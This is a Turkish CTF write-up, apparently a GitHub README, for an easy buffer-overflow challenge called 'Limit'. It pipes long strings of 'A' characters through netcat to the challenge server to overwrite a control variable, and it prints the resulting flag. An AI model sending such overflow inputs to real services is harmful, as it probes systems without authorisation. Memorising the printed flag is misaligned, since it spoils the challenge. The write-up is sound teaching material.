# 🔓 Limit - Pwn Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Pwn-Challenge-darkblue?style=for-the-badge&logo=hackaday" alt="Pwn">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Buffer%20Overflow-purple?style=for-the-badge&logo=buffer" alt="Buffer Overflow">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Pwn  
**Seviye:** Kolay  
**Puan:** 100  

**Challenge Bağlantısı:** `nc 64.226.74.243 9999`

**Firstblood Bonus:** +50 puan

---

## 🔍 Analiz

### Challenge Özeti

**Hedef:** Buffer overflow vulnerability'si kullanarak kontrol değişkenini değiştirmek

**Verilen:**
- Netcat bağlantısı: `64.226.74.243:9999`
- İpucu: "Buffer nedir? Pwn challengelarda ilk ne denemek gerekir?"

**Strateji:** Buffer overflow → Kontrol değişkenini override → Flag

---

## ✅ Çözüm Adımları

### 🔌 **1. Challenge'a Bağlanma**

İlk olarak netcat ile servera bağlanıyoruz:
```bash
nc 64.226.74.243 9999
```

**Karşılama Mesajı:**
```
==============================================
   🔓 Pwn101 Challenge
==============================================
Buffer nedir?İpucu: Pwn challengelarda ilk ne denemek gerrkir?.
Mesajınızı girin:
```

---

### 🧪 **2. İlk Testler - Buffer Overflow Denemesi**

Pwn challengelarda ilk denenmesi gereken şey **buffer overflow**'dur. Farklı boyutlarda input göndererek buffer'ın taşıp taşmadığını test ediyoruz.

**Test 1: 50 Karakter**
```bash
python3 -c "print('A'*50)" | nc 64.226.74.243 9999
```

**Çıktı:**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
==============================================
   🔓 Pwn101 Challenge
==============================================
Buffer nedir?İpucu: Pwn challengelarda ilk ne denemek gerrkir?.
Mesajınızı girin: 
Girdiğiniz mesaj: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
⚠️ Kontrol değişkeni değiştirildi!
Eski değer: 0xdeadbeef
Yeni değer: 0x41414141
🎉 Tebrikler! Flag'i buldunuz!
Flag: Flag{Bu_Kadar_B4s1t_0verfl0w_G0rmed1n1z_M1?777444}
```

> 🎯 **BAŞARİLİ!** 50 karakter buffer'ı taşırmaya yetti!

---

> 💡 50 karakterden fazla her input buffer overflow'a sebep oluyor.

---

## 🚩 **FLAG**
```
Flag{Bu_Kadar_B4s1t_0verfl0w_G0rmed1n1z_M1?777444}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔌<br><b>Netcat</b><br><sub>Network connection</sub></td>
<td align="center">🐍<br><b>Python</b><br><sub>Payload generation</sub></td>
<td align="center">💻<br><b>Terminal</b><br><sub>Command execution</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
- 🔌 **Netcat:** `nc 64.226.74.243 9999`
- 🐍 **Python Payload:** `python3 -c "print('A'*50)"`
- 📊 **Pipe:** `|` (Output'u netcat'e yönlendirme)

---

## 💻 **Kullanılan Komutlar**

### **Manuel Bağlantı:**
```bash
nc 64.226.74.243 9999
```

### **Otomatik Payload Gönderme:**
```bash
# 50 karakter test
python3 -c "print('A'*50)" | nc 64.226.74.243 9999

# 200 karakter test
python3 -c "print('A'*200)" | nc 64.226.74.243 9999

# 500 karakter test
python3 -c "print('A'*500)" | nc 64.226.74.243 9999
```

### **Alternatif: Echo Kullanımı**
```bash
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | nc 64.226.74.243 9999
```

---

## 💭 **Çözüm Akış Şeması**
```
🔓 Pwn Challenge: "Limit"
                    ↓
        🔌 nc 64.226.74.243 9999 ile bağlan
                    ↓
        📝 "Buffer nedir?" sorusu
                    ↓
        💡 Buffer Overflow dene
                    ↓
        🐍 python3 -c "print('A'*50)"
                    ↓
        📤 Payload'ı netcat'e gönder
                    ↓
        💥 Buffer taştı!
                    ↓
        🔄 Kontrol değişkeni değişti
                    ↓
        0xdeadbeef → 0x41414141
                    ↓
        🎉 Program flag'i verdi
                    ↓
        🚩 Flag{Bu_Kadar_B4s1t_0verfl0w_G0rmed1n1z_M1?777444}
```
